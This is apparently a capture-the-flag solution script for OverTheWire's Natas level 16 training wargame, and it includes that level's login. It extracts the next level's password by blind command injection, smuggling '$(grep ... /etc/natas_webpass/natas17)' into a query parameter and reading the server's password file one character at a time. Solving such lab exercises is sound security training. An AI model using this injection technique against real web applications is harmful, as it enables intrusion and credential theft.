#!/usr/bin/python

import urllib, requests, string

chars = string.ascii_letters + string.digits

auth = ("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
params = {}

pass_chars = ''

# for char in chars:
#     params['needle'] = "asian$(grep %s /etc/natas_webpass/natas17)" % char
#     url = "http://natas16.natas.labs.overthewire.org?" + urllib.parse.urlencode(params) 

#     r = requests.get(url, auth=auth)

#     if 'Asian' not in r.text:
#         pass_chars += char

# print("Password Chars:", pass_chars)

pass_chars = 'bcdghkmnqrswAGHNPQSW035789'

password = ''
for _ in range(32):
    for char in pass_chars:
        # check for behind pass
        params['needle'] = "asian$(grep %s%s /etc/natas_webpass/natas17)" % (password, char)
        url = "http://natas16.natas.labs.overthewire.org?" + urllib.parse.urlencode(params) 
        r = requests.get(url, auth=auth)
        if 'Asian' not in r.text:
            password += char
            print("Password:", password)

        # check for before pass
        params['needle'] = "asian$(grep %s%s /etc/natas_webpass/natas17)" % (char, password)
        url = "http://natas16.natas.labs.overthewire.org?" + urllib.parse.urlencode(params) 
        r = requests.get(url, auth=auth)
        if 'Asian' not in r.text:
            password = char + password
            print("Password:", password)
